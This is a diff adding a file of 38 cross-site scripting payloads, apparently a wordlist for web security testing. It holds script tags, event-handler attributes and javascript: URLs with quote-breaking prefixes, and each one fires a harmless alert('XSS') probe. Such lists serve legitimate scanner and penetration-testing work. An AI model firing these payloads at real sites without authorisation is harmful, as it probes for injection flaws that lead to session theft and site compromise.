@@ -1,0 +1,38 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+javascript:alert('XSS')
+"><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+'><script>alert('XSS')</script>
+'><img src=x onerror=alert('XSS')>
+"><body onload=alert('XSS')>
+'><body onload=alert('XSS')>
+"><iframe src=javascript:alert('XSS')>
+'><iframe src=javascript:alert('XSS')>
+"><embed src=javascript:alert('XSS')>
+'><embed src=javascript:alert('XSS')>
+"><object data=javascript:alert('XSS')>
+'><object data=javascript:alert('XSS')>
+"><a href=javascript:alert('XSS')>XSS</a>
+'><a href=javascript:alert('XSS')>XSS</a>
+"><form action=javascript:alert('XSS')><input type=submit>
+'><form action=javascript:alert('XSS')><input type=submit>
+"><input onfocus=alert('XSS') autofocus>
+'><input onfocus=alert('XSS') autofocus>
+"><textarea onfocus=alert('XSS') autofocus>
+'><textarea onfocus=alert('XSS') autofocus>
+"><keygen onfocus=alert('XSS') autofocus>
+'><keygen onfocus=alert('XSS') autofocus>
+"><select onfocus=alert('XSS') autofocus>
+'><select onfocus=alert('XSS') autofocus>
+"><details open ontoggle=alert('XSS')>
+'><details open ontoggle=alert('XSS')>
+"><video><source onerror=alert('XSS')>
+'><video><source onerror=alert('XSS')>
+"><audio><source onerror=alert('XSS')>
+'><audio><source onerror=alert('XSS')>
+"><marquee onstart=alert('XSS')>
+'><marquee onstart=alert('XSS')>
+"><div style=width:1px;height:1px;overflow:scroll onscroll=alert('XSS')></div>
+'><div style=width:1px;height:1px;overflow:scroll onscroll=alert('XSS')></div>
